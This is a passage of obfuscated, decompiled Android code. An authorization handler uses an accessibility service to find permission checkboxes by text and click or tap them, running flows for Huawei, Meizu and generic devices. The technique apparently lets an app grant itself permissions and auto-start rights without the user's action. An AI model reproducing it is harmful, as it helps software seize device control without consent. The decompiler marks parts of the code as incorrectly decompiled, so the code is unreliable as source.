                                        yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54995a1 = arrayList7;
                                        yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54996a2 = list4;
                                        yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f55000a6 = 4;
                                        if (m212451a9(arrayList7, list4, yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1) == coroutineSingletons) {
                                        }
                                        c0372a9 = this;
                                    }
                                } else {
                                    yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54994a0 = this;
                                    yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54995a1 = arrayList7;
                                    yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54996a2 = list4;
                                    yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f55000a6 = 3;
                                    if (m212455b3(arrayList7, list4, yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1) == coroutineSingletons) {
                                    }
                                    c0372a9 = this;
                                }
                                List list5 = list4;
                                list = arrayList7;
                                list2 = list5;
                                r4 = c0372a9;
                                String str = r4.f55148a5;
                                list.size();
                                list2.size();
                                r4.m212462c7(false);
                                return C1351vv.f60710b1;
                            }
                            String strM214562a0 = s60.m214562a0();
                            if (!strM214562a0.equals("generic")) {
                                try {
                                    if (s60.m214564a2(this.f53209a1)) {
                                        arrayList7.add("国际品牌自启动适配(" + strM214562a0 + ")");
                                        yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54994a0 = this;
                                        yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54995a1 = arrayList7;
                                        yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54996a2 = list4;
                                        yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54997a3 = r4;
                                        yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f55000a6 = 1;
                                        if (b81.m210571b1(3000L, yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1) == coroutineSingletons) {
                                        }
                                    } else {
                                        r4.add("国际品牌 " + strM214562a0 + " 自启动适配未生效");
                                    }
                                } catch (Exception e) {
                                    e = e;
                                    c0372a92 = this;
                                    arrayList4 = r4;
                                    String str2 = c0372a92.f55148a5;
                                    e.getMessage();
                                    arrayList4.add("国际品牌适配异常: " + e.getMessage());
                                    arrayList5 = arrayList4;
                                    r6 = c0372a92;
                                    yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54994a0 = r6;
                                    yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54995a1 = arrayList7;
                                    yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54996a2 = list4;
                                    yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54997a3 = null;
                                    yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f55000a6 = 2;
                                    if (r6.m212450a8(arrayList7, list4, arrayList5, yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1) != coroutineSingletons) {
                                    }
                                    return coroutineSingletons;
                                }
                            }
                            r6 = this;
                            arrayList5 = r4;
                            yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54994a0 = r6;
                            yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54995a1 = arrayList7;
                            yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54996a2 = list4;
                            yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54997a3 = null;
                            yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f55000a6 = 2;
                            if (r6.m212450a8(arrayList7, list4, arrayList5, yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1) != coroutineSingletons) {
                                List list6 = list4;
                                list = arrayList7;
                                list2 = list6;
                                r4 = r6;
                                String str3 = r4.f55148a5;
                                list.size();
                                list2.size();
                                r4.m212462c7(false);
                                return C1351vv.f60710b1;
                            }
                            return coroutineSingletons;
                        } catch (Throwable th) {
                            th = th;
                            r4 = this;
                            r4.getClass();
                            r4.m212462c7(false);
                            throw th;
                        }
                    case 1:
                        ArrayList arrayList8 = yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54997a3;
                        list4 = yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54996a2;
                        ?? r42 = yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54995a1;
                        C0372a9 c0372a94 = yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54994a0;
                        try {
                            kg1.m213544f4(obj);
                            arrayList5 = arrayList8;
                            arrayList7 = r42;
                            r6 = c0372a94;
                        } catch (Exception e2) {
                            e = e2;
                            arrayList4 = arrayList8;
                            arrayList7 = r42;
                            c0372a92 = c0372a94;
                            String str22 = c0372a92.f55148a5;
                            e.getMessage();
                            arrayList4.add("国际品牌适配异常: " + e.getMessage());
                            arrayList5 = arrayList4;
                            r6 = c0372a92;
                            yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54994a0 = r6;
                            yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54995a1 = arrayList7;
                            yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54996a2 = list4;
                            yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54997a3 = null;
                            yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f55000a6 = 2;
                            if (r6.m212450a8(arrayList7, list4, arrayList5, yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1) != coroutineSingletons) {
                            }
                            return coroutineSingletons;
                        }
                        yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54994a0 = r6;
                        yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54995a1 = arrayList7;
                        yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54996a2 = list4;
                        yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54997a3 = null;
                        yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f55000a6 = 2;
                        if (r6.m212450a8(arrayList7, list4, arrayList5, yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1) != coroutineSingletons) {
                        }
                        return coroutineSingletons;
                    case 2:
                        list2 = yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54996a2;
                        list = yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54995a1;
                        C0372a9 c0372a95 = yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54994a0;
                        kg1.m213544f4(obj);
                        r4 = c0372a95;
                        String str32 = r4.f55148a5;
                        list.size();
                        list2.size();
                        r4.m212462c7(false);
                        return C1351vv.f60710b1;
                    case 3:
                        list3 = yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54996a2;
                        ?? r3 = yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54995a1;
                        C0372a9 c0372a96 = yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54994a0;
                        kg1.m213544f4(obj);
                        arrayList6 = r3;
                        c0372a93 = c0372a96;
                        ArrayList arrayList9 = arrayList6;
                        list4 = list3;
                        arrayList7 = arrayList9;
                        c0372a9 = c0372a93;
                        List list52 = list4;
                        list = arrayList7;
                        list2 = list52;
                        r4 = c0372a9;
                        String str322 = r4.f55148a5;
                        list.size();
                        list2.size();
                        r4.m212462c7(false);
                        return C1351vv.f60710b1;
                    case 4:
                        list3 = yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54996a2;
                        ?? r32 = yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54995a1;
                        C0372a9 c0372a97 = yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54994a0;
                        kg1.m213544f4(obj);
                        arrayList6 = r32;
                        c0372a93 = c0372a97;
                        ArrayList arrayList92 = arrayList6;
                        list4 = list3;
                        arrayList7 = arrayList92;
                        c0372a9 = c0372a93;
                        List list522 = list4;
                        list = arrayList7;
                        list2 = list522;
                        r4 = c0372a9;
                        String str3222 = r4.f55148a5;
                        list.size();
                        list2.size();
                        r4.m212462c7(false);
                        return C1351vv.f60710b1;
                    case 5:
                        list3 = yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54996a2;
                        ?? r33 = yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54995a1;
                        C0372a9 c0372a98 = yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54994a0;
                        kg1.m213544f4(obj);
                        arrayList6 = r33;
                        c0372a93 = c0372a98;
                        ArrayList arrayList922 = arrayList6;
                        list4 = list3;
                        arrayList7 = arrayList922;
                        c0372a9 = c0372a93;
                        List list5222 = list4;
                        list = arrayList7;
                        list2 = list5222;
                        r4 = c0372a9;
                        String str32222 = r4.f55148a5;
                        list.size();
                        list2.size();
                        r4.m212462c7(false);
                        return C1351vv.f60710b1;
                    case 6:
                        list3 = yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54996a2;
                        ?? r34 = yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54995a1;
                        C0372a9 c0372a99 = yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54994a0;
                        kg1.m213544f4(obj);
                        arrayList6 = r34;
                        c0372a93 = c0372a99;
                        ArrayList arrayList9222 = arrayList6;
                        list4 = list3;
                        arrayList7 = arrayList9222;
                        c0372a9 = c0372a93;
                        List list52222 = list4;
                        list = arrayList7;
                        list2 = list52222;
                        r4 = c0372a9;
                        String str322222 = r4.f55148a5;
                        list.size();
                        list2.size();
                        r4.m212462c7(false);
                        return C1351vv.f60710b1;
                    case 7:
                        list3 = yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54996a2;
                        ?? r35 = yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54995a1;
                        C0372a9 c0372a910 = yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54994a0;
                        kg1.m213544f4(obj);
                        arrayList6 = r35;
                        c0372a93 = c0372a910;
                        ArrayList arrayList92222 = arrayList6;
                        list4 = list3;
                        arrayList7 = arrayList92222;
                        c0372a9 = c0372a93;
                        List list522222 = list4;
                        list = arrayList7;
                        list2 = list522222;
                        r4 = c0372a9;
                        String str3222222 = r4.f55148a5;
                        list.size();
                        list2.size();
                        r4.m212462c7(false);
                        return C1351vv.f60710b1;
                    case 8:
                        list3 = yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54996a2;
                        ?? r36 = yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54995a1;
                        C0372a9 c0372a911 = yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54994a0;
                        kg1.m213544f4(obj);
                        arrayList6 = r36;
                        c0372a93 = c0372a911;
                        ArrayList arrayList922222 = arrayList6;
                        list4 = list3;
                        arrayList7 = arrayList922222;
                        c0372a9 = c0372a93;
                        List list5222222 = list4;
                        list = arrayList7;
                        list2 = list5222222;
                        r4 = c0372a9;
                        String str32222222 = r4.f55148a5;
                        list.size();
                        list2.size();
                        r4.m212462c7(false);
                        return C1351vv.f60710b1;
                    case 9:
                        list3 = yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54996a2;
                        ?? r37 = yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54995a1;
                        C0372a9 c0372a912 = yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54994a0;
                        kg1.m213544f4(obj);
                        arrayList6 = r37;
                        c0372a93 = c0372a912;
                        ArrayList arrayList9222222 = arrayList6;
                        list4 = list3;
                        arrayList7 = arrayList9222222;
                        c0372a9 = c0372a93;
                        List list52222222 = list4;
                        list = arrayList7;
                        list2 = list52222222;
                        r4 = c0372a9;
                        String str322222222 = r4.f55148a5;
                        list.size();
                        list2.size();
                        r4.m212462c7(false);
                        return C1351vv.f60710b1;
                    case 10:
                        list3 = yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54996a2;
                        ?? r38 = yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54995a1;
                        C0372a9 c0372a913 = yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54994a0;
                        kg1.m213544f4(obj);
                        arrayList6 = r38;
                        c0372a93 = c0372a913;
                        ArrayList arrayList92222222 = arrayList6;
                        list4 = list3;
                        arrayList7 = arrayList92222222;
                        c0372a9 = c0372a93;
                        List list522222222 = list4;
                        list = arrayList7;
                        list2 = list522222222;
                        r4 = c0372a9;
                        String str3222222222 = r4.f55148a5;
                        list.size();
                        list2.size();
                        r4.m212462c7(false);
                        return C1351vv.f60710b1;
                    case oe0.DEFAULT_M /* 11 */:
                        list3 = yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54996a2;
                        ?? r39 = yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54995a1;
                        C0372a9 c0372a914 = yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54994a0;
                        kg1.m213544f4(obj);
                        arrayList6 = r39;
                        c0372a93 = c0372a914;
                        ArrayList arrayList922222222 = arrayList6;
                        list4 = list3;
                        arrayList7 = arrayList922222222;
                        c0372a9 = c0372a93;
                        List list5222222222 = list4;
                        list = arrayList7;
                        list2 = list5222222222;
                        r4 = c0372a9;
                        String str32222222222 = r4.f55148a5;
                        list.size();
                        list2.size();
                        r4.m212462c7(false);
                        return C1351vv.f60710b1;
                    case FileClientSessionCache.MAX_SIZE /* 12 */:
                        list3 = yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54996a2;
                        ?? r310 = yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54995a1;
                        C0372a9 c0372a915 = yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54994a0;
                        kg1.m213544f4(obj);
                        arrayList6 = r310;
                        c0372a93 = c0372a915;
                        ArrayList arrayList9222222222 = arrayList6;
                        list4 = list3;
                        arrayList7 = arrayList9222222222;
                        c0372a9 = c0372a93;
                        List list52222222222 = list4;
                        list = arrayList7;
                        list2 = list52222222222;
                        r4 = c0372a9;
                        String str322222222222 = r4.f55148a5;
                        list.size();
                        list2.size();
                        r4.m212462c7(false);
                        return C1351vv.f60710b1;
                    case 13:
                        list3 = yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54996a2;
                        ?? r311 = yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54995a1;
                        C0372a9 c0372a916 = yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54994a0;
                        kg1.m213544f4(obj);
                        arrayList6 = r311;
                        c0372a93 = c0372a916;
                        ArrayList arrayList92222222222 = arrayList6;
                        list4 = list3;
                        arrayList7 = arrayList92222222222;
                        c0372a9 = c0372a93;
                        List list522222222222 = list4;
                        list = arrayList7;
                        list2 = list522222222222;
                        r4 = c0372a9;
                        String str3222222222222 = r4.f55148a5;
                        list.size();
                        list2.size();
                        r4.m212462c7(false);
                        return C1351vv.f60710b1;
                    case 14:
                        list3 = yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54996a2;
                        ?? r312 = yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54995a1;
                        C0372a9 c0372a917 = yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54994a0;
                        kg1.m213544f4(obj);
                        arrayList6 = r312;
                        c0372a93 = c0372a917;
                        ArrayList arrayList922222222222 = arrayList6;
                        list4 = list3;
                        arrayList7 = arrayList922222222222;
                        c0372a9 = c0372a93;
                        List list5222222222222 = list4;
                        list = arrayList7;
                        list2 = list5222222222222;
                        r4 = c0372a9;
                        String str32222222222222 = r4.f55148a5;
                        list.size();
                        list2.size();
                        r4.m212462c7(false);
                        return C1351vv.f60710b1;
                    case WebSocketProtocol.B0_MASK_OPCODE /* 15 */:
                        list3 = yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54996a2;
                        ?? r313 = yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54995a1;
                        C0372a9 c0372a918 = yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54994a0;
                        kg1.m213544f4(obj);
                        arrayList6 = r313;
                        c0372a93 = c0372a918;
                        ArrayList arrayList9222222222222 = arrayList6;
                        list4 = list3;
                        arrayList7 = arrayList9222222222222;
                        c0372a9 = c0372a93;
                        List list52222222222222 = list4;
                        list = arrayList7;
                        list2 = list52222222222222;
                        r4 = c0372a9;
                        String str322222222222222 = r4.f55148a5;
                        list.size();
                        list2.size();
                        r4.m212462c7(false);
                        return C1351vv.f60710b1;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
            } catch (Throwable th2) {
                th = th2;
                r4 = r6;
            }
        } catch (Throwable th3) {
            th = th3;
        }
    }

    /* renamed from: a3 */
    public final boolean m212447a3(AccessibilityNodeInfo accessibilityNodeInfo, String str) {
        String str2 = this.f55148a5;
        try {
            List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = accessibilityNodeInfo.findAccessibilityNodeInfosByText(str);
            if (listFindAccessibilityNodeInfosByText != null && !listFindAccessibilityNodeInfosByText.isEmpty()) {
                for (AccessibilityNodeInfo accessibilityNodeInfo2 : listFindAccessibilityNodeInfosByText) {
                    if (accessibilityNodeInfo2.isVisibleToUser()) {
                        AccessibilityNodeInfo accessibilityNodeInfoM212440b5 = m212440b5(accessibilityNodeInfo2);
                        if (accessibilityNodeInfoM212440b5 != null) {
                            if (accessibilityNodeInfoM212440b5.isChecked()) {
                                t60.m214704c5(str2, "[clickCheckboxByText] 复选框已勾选: " + str);
                                Iterator<T> it = listFindAccessibilityNodeInfosByText.iterator();
                                while (it.hasNext()) {
                                    ((AccessibilityNodeInfo) it.next()).recycle();
                                }
                                return true;
                            }
                            if (m212448a4(accessibilityNodeInfoM212440b5)) {
                                t60.m214704c5(str2, "[clickCheckboxByText] ✅ 点击复选框成功: " + str);
                                Iterator<T> it2 = listFindAccessibilityNodeInfosByText.iterator();
                                while (it2.hasNext()) {
                                    ((AccessibilityNodeInfo) it2.next()).recycle();
                                }
                                return true;
                            }
                        }
                        if (m212448a4(accessibilityNodeInfo2)) {
                            t60.m214704c5(str2, "[clickCheckboxByText] ✅ 直接点击文本成功: " + str);
                            Iterator<T> it3 = listFindAccessibilityNodeInfosByText.iterator();
                            while (it3.hasNext()) {
                                ((AccessibilityNodeInfo) it3.next()).recycle();
                            }
                            return true;
                        }
                    }
                }
                Iterator<T> it4 = listFindAccessibilityNodeInfosByText.iterator();
                while (it4.hasNext()) {
                    ((AccessibilityNodeInfo) it4.next()).recycle();
                }
            }
            return false;
        } catch (Exception e) {
            tz0.m214807a7("[clickCheckboxByText] 异常: ", e.getMessage(), str2);
            return false;
        }
    }

    /* renamed from: a4 */
    public final boolean m212448a4(AccessibilityNodeInfo accessibilityNodeInfo) {
        if (accessibilityNodeInfo.isClickable() && accessibilityNodeInfo.performAction(16)) {
            return true;
        }
        AccessibilityNodeInfo parent = accessibilityNodeInfo.getParent();
        int i = 0;
        while (parent != null && i < 5) {
            if (parent.isClickable() && parent.performAction(16)) {
                parent.recycle();
                return true;
            }
            AccessibilityNodeInfo parent2 = parent.getParent();
            parent.recycle();
            i++;
            parent = parent2;
        }
        try {
            Rect rect = new Rect();
            accessibilityNodeInfo.getBoundsInScreen(rect);
            float fCenterX = rect.centerX();
            float fCenterY = rect.centerY();
            Path path = new Path();
            path.moveTo(fCenterX, fCenterY);
            GestureDescription.Builder builder = new GestureDescription.Builder();
            builder.addStroke(new GestureDescription.StrokeDescription(path, 0L, 50L));
            this.f53208a0.dispatchGesture(builder.build(), null, null);
            return true;
        } catch (Exception unused) {
            return false;
        }
    }

    /* renamed from: a5 */
    public final boolean m212449a5(AccessibilityNodeInfo accessibilityNodeInfo, String str) {
        String string;
        String string2;
        try {
            List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = accessibilityNodeInfo.findAccessibilityNodeInfosByText(str);
            if (listFindAccessibilityNodeInfosByText != null && !listFindAccessibilityNodeInfosByText.isEmpty()) {
                for (AccessibilityNodeInfo accessibilityNodeInfo2 : listFindAccessibilityNodeInfosByText) {
                    if (accessibilityNodeInfo2.isVisibleToUser()) {
                        CharSequence text = accessibilityNodeInfo2.getText();
                        if (text == null || (string2 = text.toString()) == null || (string = AbstractC0779a1.m213687e0(string2).toString()) == null) {
                            string = "";
                        }
                        if (string.equals(str) || AbstractC0779a1.m213652a5(string, str, false)) {
                            if (m212448a4(accessibilityNodeInfo2)) {
                                Iterator<T> it = listFindAccessibilityNodeInfosByText.iterator();
                                while (it.hasNext()) {
                                    ((AccessibilityNodeInfo) it.next()).recycle();
                                }
                                return true;
                            }
                        }
                    }
                }
                Iterator<T> it2 = listFindAccessibilityNodeInfosByText.iterator();
                while (it2.hasNext()) {
                    ((AccessibilityNodeInfo) it2.next()).recycle();
                }
            }
        } catch (Exception unused) {
        }
        return false;
    }

    /* JADX WARN: Removed duplicated region for block: B:25:0x0066 A[Catch: Exception -> 0x002f, TryCatch #0 {Exception -> 0x002f, blocks: (B:12:0x002b, B:23:0x005e, B:25:0x0066, B:26:0x006c), top: B:33:0x002b }] */
    /* JADX WARN: Removed duplicated region for block: B:26:0x006c A[Catch: Exception -> 0x002f, TRY_LEAVE, TryCatch #0 {Exception -> 0x002f, blocks: (B:12:0x002b, B:23:0x005e, B:25:0x0066, B:26:0x006c), top: B:33:0x002b }] */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0013  */
    /* renamed from: a8 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212450a8(List list, List list2, List list3, ContinuationImpl continuationImpl) throws Throwable {
        Yw5xudAuthorizationHandler$executeGenericAuthorization$1 yw5xudAuthorizationHandler$executeGenericAuthorization$1;
        C0372a9 c0372a9;
        if (continuationImpl instanceof Yw5xudAuthorizationHandler$executeGenericAuthorization$1) {
            yw5xudAuthorizationHandler$executeGenericAuthorization$1 = (Yw5xudAuthorizationHandler$executeGenericAuthorization$1) continuationImpl;
            int i = yw5xudAuthorizationHandler$executeGenericAuthorization$1.f55007a6;
            if ((i & Integer.MIN_VALUE) != 0) {
                yw5xudAuthorizationHandler$executeGenericAuthorization$1.f55007a6 = i - Integer.MIN_VALUE;
            } else {
                yw5xudAuthorizationHandler$executeGenericAuthorization$1 = new Yw5xudAuthorizationHandler$executeGenericAuthorization$1(this, continuationImpl);
            }
        }
        Object objM212128a8 = yw5xudAuthorizationHandler$executeGenericAuthorization$1.f55005a4;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i2 = yw5xudAuthorizationHandler$executeGenericAuthorization$1.f55007a6;
        if (i2 == 0) {
            kg1.m213544f4(objM212128a8);
            try {
                t60.m214704c5(this.f55148a5, "[通用授权] ★★★ 使用国外通用适配 GenericSteps ★★★");
                C0364a1 c0364a1 = new C0364a1(this.f53208a0, this.f53209a1);
                yw5xudAuthorizationHandler$executeGenericAuthorization$1.f55001a0 = this;
                yw5xudAuthorizationHandler$executeGenericAuthorization$1.f55002a1 = list;
                yw5xudAuthorizationHandler$executeGenericAuthorization$1.f55003a2 = list2;
                yw5xudAuthorizationHandler$executeGenericAuthorization$1.f55004a3 = list3;
                yw5xudAuthorizationHandler$executeGenericAuthorization$1.f55007a6 = 1;
                objM212128a8 = c0364a1.m212128a8(yw5xudAuthorizationHandler$executeGenericAuthorization$1);
                if (objM212128a8 == coroutineSingletons) {
                    return coroutineSingletons;
                }
                if (((Boolean) objM212128a8).booleanValue()) {
                }
            } catch (Exception e) {
                e = e;
                c0372a9 = this;
                t60.m214705c6(c0372a9.f55148a5, "[通用授权] ❌ 执行失败: " + e.getMessage(), e);
                list2.add("国外通用授权流程异常: " + e.getMessage());
                list3.add("当前品牌无专属适配，通用流程执行异常");
                return C1351vv.f60710b1;
            }
        } else {
            if (i2 != 1) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            list3 = yw5xudAuthorizationHandler$executeGenericAuthorization$1.f55004a3;
            list2 = yw5xudAuthorizationHandler$executeGenericAuthorization$1.f55003a2;
            list = yw5xudAuthorizationHandler$executeGenericAuthorization$1.f55002a1;
            c0372a9 = yw5xudAuthorizationHandler$executeGenericAuthorization$1.f55001a0;
            try {
                kg1.m213544f4(objM212128a8);
                if (((Boolean) objM212128a8).booleanValue()) {
                    list2.add("国外通用授权流程部分失败");
                } else {
                    list.add("国外通用授权流程");
                }
            } catch (Exception e2) {
                e = e2;
                t60.m214705c6(c0372a9.f55148a5, "[通用授权] ❌ 执行失败: " + e.getMessage(), e);
                list2.add("国外通用授权流程异常: " + e.getMessage());
                list3.add("当前品牌无专属适配，通用流程执行异常");
                return C1351vv.f60710b1;
            }
        }
        return C1351vv.f60710b1;
    }

    /* JADX WARN: Removed duplicated region for block: B:7:0x0013  */
    /* renamed from: a9 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212451a9(List list, List list2, ContinuationImpl continuationImpl) throws Throwable {
        Yw5xudAuthorizationHandler$executeHuaweiAuthorization$1 yw5xudAuthorizationHandler$executeHuaweiAuthorization$1;
        C0372a9 c0372a9;
        if (continuationImpl instanceof Yw5xudAuthorizationHandler$executeHuaweiAuthorization$1) {
            yw5xudAuthorizationHandler$executeHuaweiAuthorization$1 = (Yw5xudAuthorizationHandler$executeHuaweiAuthorization$1) continuationImpl;
            int i = yw5xudAuthorizationHandler$executeHuaweiAuthorization$1.f55013a5;
            if ((i & Integer.MIN_VALUE) != 0) {
                yw5xudAuthorizationHandler$executeHuaweiAuthorization$1.f55013a5 = i - Integer.MIN_VALUE;
            } else {
                yw5xudAuthorizationHandler$executeHuaweiAuthorization$1 = new Yw5xudAuthorizationHandler$executeHuaweiAuthorization$1(this, continuationImpl);
            }
        }
        Object objM212162a9 = yw5xudAuthorizationHandler$executeHuaweiAuthorization$1.f55011a3;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i2 = yw5xudAuthorizationHandler$executeHuaweiAuthorization$1.f55013a5;
        if (i2 == 0) {
            kg1.m213544f4(objM212162a9);
            C0365a2 c0365a2 = new C0365a2(this.f53208a0, this.f53209a1);
            yw5xudAuthorizationHandler$executeHuaweiAuthorization$1.f55008a0 = this;
            yw5xudAuthorizationHandler$executeHuaweiAuthorization$1.f55009a1 = list;
            yw5xudAuthorizationHandler$executeHuaweiAuthorization$1.f55010a2 = list2;
            yw5xudAuthorizationHandler$executeHuaweiAuthorization$1.f55013a5 = 1;
            objM212162a9 = c0365a2.m212162a9(yw5xudAuthorizationHandler$executeHuaweiAuthorization$1);
            if (objM212162a9 == coroutineSingletons) {
                return coroutineSingletons;
            }
            c0372a9 = this;
        } else {
            if (i2 != 1) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            list2 = yw5xudAuthorizationHandler$executeHuaweiAuthorization$1.f55010a2;
            list = yw5xudAuthorizationHandler$executeHuaweiAuthorization$1.f55009a1;
            c0372a9 = yw5xudAuthorizationHandler$executeHuaweiAuthorization$1.f55008a0;
            kg1.m213544f4(objM212162a9);
        }
        if (((Boolean) objM212162a9).booleanValue()) {
            list.add("华为/荣耀授权");
            String str = c0372a9.f55148a5;
        } else {
            list2.add("华为/荣耀授权");
            String str2 = c0372a9.f55148a5;
        }
        return C1351vv.f60710b1;
    }

    /* JADX WARN: Removed duplicated region for block: B:25:0x006d A[Catch: Exception -> 0x002d, TryCatch #0 {Exception -> 0x002d, blocks: (B:12:0x0029, B:23:0x0065, B:25:0x006d, B:26:0x0073), top: B:33:0x0029 }] */
    /* JADX WARN: Removed duplicated region for block: B:26:0x0073 A[Catch: Exception -> 0x002d, TRY_LEAVE, TryCatch #0 {Exception -> 0x002d, blocks: (B:12:0x0029, B:23:0x0065, B:25:0x006d, B:26:0x0073), top: B:33:0x0029 }] */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0013  */
    /* renamed from: b0 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212452b0(List list, List list2, ContinuationImpl continuationImpl) throws Throwable {
        Yw5xudAuthorizationHandler$executeMeizuAuthorization$1 yw5xudAuthorizationHandler$executeMeizuAuthorization$1;
        C0372a9 c0372a9;
        if (continuationImpl instanceof Yw5xudAuthorizationHandler$executeMeizuAuthorization$1) {
            yw5xudAuthorizationHandler$executeMeizuAuthorization$1 = (Yw5xudAuthorizationHandler$executeMeizuAuthorization$1) continuationImpl;
            int i = yw5xudAuthorizationHandler$executeMeizuAuthorization$1.f55019a5;
            if ((i & Integer.MIN_VALUE) != 0) {
                yw5xudAuthorizationHandler$executeMeizuAuthorization$1.f55019a5 = i - Integer.MIN_VALUE;
            } else {
                yw5xudAuthorizationHandler$executeMeizuAuthorization$1 = new Yw5xudAuthorizationHandler$executeMeizuAuthorization$1(this, continuationImpl);
            }
        }
        Object objM212227a7 = yw5xudAuthorizationHandler$executeMeizuAuthorization$1.f55017a3;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i2 = yw5xudAuthorizationHandler$executeMeizuAuthorization$1.f55019a5;
        if (i2 == 0) {
            kg1.m213544f4(objM212227a7);
            Context context = this.f53209a1;
            String string = context.getApplicationInfo().loadLabel(context.getPackageManager()).toString();
            C0366a3 c0366a3 = new C0366a3(this.f53208a0, context, this.f55148a5);
            try {
                yw5xudAuthorizationHandler$executeMeizuAuthorization$1.f55014a0 = this;
                yw5xudAuthorizationHandler$executeMeizuAuthorization$1.f55015a1 = list;
                yw5xudAuthorizationHandler$executeMeizuAuthorization$1.f55016a2 = list2;
                yw5xudAuthorizationHandler$executeMeizuAuthorization$1.f55019a5 = 1;
